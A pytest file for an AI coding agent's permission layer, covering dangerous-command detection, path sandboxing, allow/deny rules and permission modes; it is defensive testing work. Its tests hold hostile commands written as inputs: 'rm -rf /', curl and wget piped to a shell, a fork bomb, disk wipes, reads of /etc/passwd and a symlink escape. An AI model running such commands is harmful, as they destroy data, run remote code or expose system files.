"""ch06 permission system tests — blacklist, sandbox, rules, modes, checker."""

from __future__ import annotations

import pytest

from mewcode.agent import Agent, PermissionResponse, ToolResultEvent
from mewcode.client import LLMClient
from mewcode.conversation import ConversationManager
from mewcode.permissions import (
    DangerousCommandDetector,
    PathSandbox,
    PermissionChecker,
    PermissionMode,
    Rule,
    RuleEngine,
    extract_content,
    is_safe_command,
    mode_decide,
    parse_rule,
)
from mewcode.tools import create_default_registry
from mewcode.tools.base import StreamEnd, TextDelta, ToolCallComplete, ToolCallStart


# --- Layer 1: dangerous commands ------------------------------------------ #


class TestDangerousCommandDetector:
    def test_rm_rf_root(self):
        assert DangerousCommandDetector().detect("rm -rf /")[0] is True

    def test_curl_pipe_sh(self):
        assert DangerousCommandDetector().detect("curl http://x | sh")[0] is True

    def test_wget_pipe_bash(self):
        assert DangerousCommandDetector().detect("wget http://x|bash")[0] is True

    def test_fork_bomb(self):
        assert DangerousCommandDetector().detect(":(){ :|:& };:")[0] is True

    def test_mkfs_dd_chmod_devwrite(self):
        d = DangerousCommandDetector()
        assert d.detect("mkfs.ext4 /dev/sdb")[0]
        assert d.detect("dd if=/dev/zero of=/dev/sda")[0]
        assert d.detect("chmod -R 777 /")[0]
        assert d.detect("echo x > /dev/sdb")[0]

    def test_normal_commands_not_flagged(self):
        d = DangerousCommandDetector()
        for c in ["ls -la", "pytest -q", "git status", "python app.py", "rm foo.txt"]:
            assert d.detect(c)[0] is False

    def test_safe_command_whitelist(self):
        assert is_safe_command("ls -la")
        assert is_safe_command("git status")
        assert not is_safe_command("rm -rf /")
        assert not is_safe_command("cat a | sh")  # shell metachar


# --- Layer 2: sandbox ------------------------------------------------------ #


class TestPathSandbox:
    def test_inside_root_ok(self, tmp_path):
        sb = PathSandbox(str(tmp_path))
        ok, _ = sb.check(str(tmp_path / "a.txt"))
        assert ok is True

    def test_outside_root_denied(self, tmp_path):
        sb = PathSandbox(str(tmp_path))
        ok, reason = sb.check("/etc/passwd")
        assert ok is False
        assert "超出沙箱范围" in reason

    def test_tempdir_allowed(self, tmp_path):
        import tempfile
        sb = PathSandbox(str(tmp_path))
        ok, _ = sb.check(tempfile.gettempdir() + "/x.txt")
        assert ok is True

    def test_symlink_escape_blocked(self, tmp_path):
        import os
        # symlink that resolves to /etc — outside both project root and tempdir
        link = tmp_path / "link"
        os.symlink("/etc", link)
        sb = PathSandbox(str(tmp_path))
        ok, _ = sb.check(str(link / "passwd"))
        assert ok is False  # resolved symlink points outside the sandbox


# --- Layer 3: rules -------------------------------------------------------- #


class TestRuleEngine:
    def test_parse_rule(self):
        r = parse_rule("Bash(rm *)", "deny")
        assert r.tool_name == "Bash" and r.pattern == "rm *" and r.effect == "deny"

    def test_parse_rule_invalid(self):
        with pytest.raises(ValueError):
            parse_rule("not a rule", "deny")

    def test_extract_content(self):
        assert extract_content("Bash", {"command": "ls"}) == "ls"
        assert extract_content("WriteFile", {"file_path": "/a"}) == "/a"
        assert extract_content("Unknown", {}) == ""

    def test_rule_match_glob(self):
        assert Rule("Bash", "rm *", "deny").matches("Bash", "rm foo")
        assert not Rule("Bash", "rm *", "deny").matches("Bash", "ls foo")

    def test_evaluate_and_local_overrides(self, tmp_path):
        proj = tmp_path / "proj.yaml"
        proj.write_text("- {rule: 'WriteFile(/tmp/*)', effect: deny}\n")
        local = tmp_path / "local.yaml"
        local.write_text("- {rule: 'WriteFile(/tmp/*)', effect: allow}\n")
        eng = RuleEngine(project_rules_path=str(proj), local_rules_path=str(local))
        # local (allow) overrides project (deny)
        assert eng.evaluate("WriteFile", "/tmp/a.txt") == "allow"

    def test_evaluate_no_match(self, tmp_path):
        eng = RuleEngine()
        assert eng.evaluate("Bash", "ls") is None

    def test_wildcard_tool(self):
        # a Rule with tool_name "*" matches any tool
        wild = Rule("*", "secret*", "deny")
        assert wild.matches("ReadFile", "secret.txt")
        assert wild.matches("Bash", "secret_dump")

    def test_bad_rule_skipped(self, tmp_path):
        f = tmp_path / "r.yaml"
        f.write_text("- {rule: 'garbage', effect: deny}\n- {rule: 'Bash(ls)', effect: allow}\n")
        eng = RuleEngine(local_rules_path=str(f))
        assert eng.evaluate("Bash", "ls") == "allow"  # good rule survives

    def test_append_local_rule_roundtrip(self, tmp_path):
        f = tmp_path / "sub" / "local.yaml"
        eng = RuleEngine(local_rules_path=str(f))
        eng.append_local_rule(Rule("WriteFile", "/p/*", "allow"))
        eng2 = RuleEngine(local_rules_path=str(f))
        assert eng2.evaluate("WriteFile", "/p/a") == "allow"


# --- mode matrix ----------------------------------------------------------- #


class TestPermissionMode:
    def test_default(self):
        assert mode_decide(PermissionMode.DEFAULT, "read") == "allow"
        assert mode_decide(PermissionMode.DEFAULT, "write") == "ask"
        assert mode_decide(PermissionMode.DEFAULT, "command") == "ask"

    def test_bypass_allows(self):
        for cat in ("read", "write", "command"):
            assert mode_decide(PermissionMode.BYPASS, cat) == "allow"

    def test_accept_edits(self):
        assert mode_decide(PermissionMode.ACCEPT_EDITS, "write") == "allow"
        assert mode_decide(PermissionMode.ACCEPT_EDITS, "command") == "ask"


# --- checker integration --------------------------------------------------- #


class TestPermissionChecker:
    def _checker(self, tmp_path, mode=PermissionMode.DEFAULT):
        return PermissionChecker(
            DangerousCommandDetector(),
            PathSandbox(str(tmp_path)),
            RuleEngine(),
            mode=mode,
        )

    def test_dangerous_denied(self, tmp_path):
        reg = create_default_registry()
        d = self._checker(tmp_path).check(reg.get("Bash"), {"command": "rm -rf /"})
        assert d.effect == "deny" and "危险命令" in d.reason

    def test_safe_command_allowed(self, tmp_path):
        reg = create_default_registry()
        d = self._checker(tmp_path).check(reg.get("Bash"), {"command": "ls -la"})
        assert d.effect == "allow"

    def test_sandbox_denied(self, tmp_path):
        reg = create_default_registry()
        d = self._checker(tmp_path).check(reg.get("ReadFile"), {"file_path": "/etc/passwd"})
        assert d.effect == "deny" and "沙箱" in d.reason

    def test_default_write_asks(self, tmp_path):
        reg = create_default_registry()
        d = self._checker(tmp_path).check(
            reg.get("WriteFile"), {"file_path": str(tmp_path / "a.txt"), "content": "x"}
        )
        assert d.effect == "ask"

    def test_default_read_allows(self, tmp_path):
        reg = create_default_registry()
        f = tmp_path / "a.txt"
        f.write_text("x")
        d = self._checker(tmp_path).check(reg.get("ReadFile"), {"file_path": str(f)})
        assert d.effect == "allow"

    def test_bypass_still_blocks_dangerous(self, tmp_path):
        reg = create_default_registry()
        chk = self._checker(tmp_path, PermissionMode.BYPASS)
        assert chk.check(reg.get("Bash"), {"command": "rm -rf /"}).effect == "deny"
        # but a normal write is allowed under bypass
        assert chk.check(
            reg.get("WriteFile"), {"file_path": str(tmp_path / "b.txt"), "content": "y"}
        ).effect == "allow"

    def test_plan_mode_allows_plan_file(self, tmp_path):
        reg = create_default_registry()
        chk = self._checker(tmp_path, PermissionMode.PLAN)
        chk.plan_file_path = str(tmp_path / ".mewcode" / "plans" / "x.md")
        plan = chk.check(
            reg.get("WriteFile"),
            {"file_path": str(tmp_path / ".mewcode" / "plans" / "x.md"), "content": "p"},
        )
        assert plan.effect == "allow"
        other = chk.check(
            reg.get("WriteFile"),
            {"file_path": str(tmp_path / "code.py"), "content": "x"},
        )
        assert other.effect == "deny"  # plan mode blocks non-plan writes

    def test_bypass_still_blocks_sandbox(self, tmp_path):
        reg = create_default_registry()
        chk = self._checker(tmp_path, PermissionMode.BYPASS)
        assert chk.check(reg.get("WriteFile"), {"file_path": "/etc/x", "content": "z"}).effect == "deny"


# --- Agent e2e ------------------------------------------------------------- #


class _Scripted(LLMClient):
    def __init__(self, batches):
        super().__init__()
        self._b = batches
        self.i = 0

    async def stream(self, conversation, system, tools):  # type: ignore[override]
        batch = self._b[min(self.i, len(self._b) - 1)]
        self.i += 1
        for e in batch:
            yield e


def _tc(tid, name, args):
    return [ToolCallStart(tid, name), ToolCallComplete(tid, name, args)]


def _checker(tmp_path, mode=PermissionMode.DEFAULT):
    return PermissionChecker(
        DangerousCommandDetector(), PathSandbox(str(tmp_path)), RuleEngine(), mode=mode
    )


async def _events(agent, conv):
    return [e async for e in agent.run(conv)]


@pytest.mark.asyncio
async def test_e2e_dangerous_command_blocked(tmp_path):
    client = _Scripted([
        [*_tc("t1", "Bash", {"command": "rm -rf /"}), StreamEnd("tool_use", 1, 1)],
        [TextDelta("ok"), StreamEnd("end_turn", 1, 1)],
    ])
    agent = Agent(client, create_default_registry(), "anthropic",
                  work_dir=str(tmp_path), permission_checker=_checker(tmp_path))
    conv = ConversationManager()
    conv.add_user_message("delete everything")
    events = await _events(agent, conv)
    res = [e for e in events if isinstance(e, ToolResultEvent)][0]
    assert res.is_error and "危险命令" in res.output


@pytest.mark.asyncio
async def test_e2e_sandbox_blocks_outside(tmp_path):
    client = _Scripted([
        [*_tc("t1", "ReadFile", {"file_path": "/etc/passwd"}), StreamEnd("tool_use", 1, 1)],
        [TextDelta("ok"), StreamEnd("end_turn", 1, 1)],
    ])
    agent = Agent(client, create_default_registry(), "anthropic",
                  work_dir=str(tmp_path), permission_checker=_checker(tmp_path))
    conv = ConversationManager()
    conv.add_user_message("read passwd")
    events = await _events(agent, conv)
    res = [e for e in events if isinstance(e, ToolResultEvent)][0]
    assert res.is_error and "沙箱" in res.output


@pytest.mark.asyncio
async def test_e2e_ask_user_denies(tmp_path):
    async def deny(tool, args):
        return PermissionResponse.DENY

    client = _Scripted([
        [*_tc("t1", "WriteFile", {"file_path": str(tmp_path / "a.txt"), "content": "x"}),
         StreamEnd("tool_use", 1, 1)],
        [TextDelta("ok"), StreamEnd("end_turn", 1, 1)],
    ])
    agent = Agent(client, create_default_registry(), "anthropic",
                  work_dir=str(tmp_path), permission_checker=_checker(tmp_path),
                  ask_permission=deny)
    conv = ConversationManager()
    conv.add_user_message("write")
    events = await _events(agent, conv)
    res = [e for e in events if isinstance(e, ToolResultEvent)][0]
    assert res.is_error and "denied by user" in res.output
    assert not (tmp_path / "a.txt").exists()  # not executed


@pytest.mark.asyncio
async def test_e2e_allow_always_self_learns(tmp_path):
    local = tmp_path / ".mewcode" / "permissions.local.yaml"
    eng = RuleEngine(local_rules_path=str(local))
    checker = PermissionChecker(
        DangerousCommandDetector(), PathSandbox(str(tmp_path)), eng,
        mode=PermissionMode.DEFAULT,
    )

    async def allow_always(tool, args):
        return PermissionResponse.ALLOW_ALWAYS

    client = _Scripted([
        [*_tc("t1", "WriteFile", {"file_path": str(tmp_path / "a.txt"), "content": "x"}),
         StreamEnd("tool_use", 1, 1)],
        [TextDelta("done"), StreamEnd("end_turn", 1, 1)],
    ])
    agent = Agent(client, create_default_registry(), "anthropic",
                  work_dir=str(tmp_path), permission_checker=checker,
                  ask_permission=allow_always)
    conv = ConversationManager()
    conv.add_user_message("write a")
    await _events(agent, conv)
    # file written + a local rule persisted
    assert (tmp_path / "a.txt").read_text() == "x"
    assert local.exists()
    assert RuleEngine(local_rules_path=str(local)).evaluate(
        "WriteFile", str(tmp_path / "a.txt")
    ) == "allow"
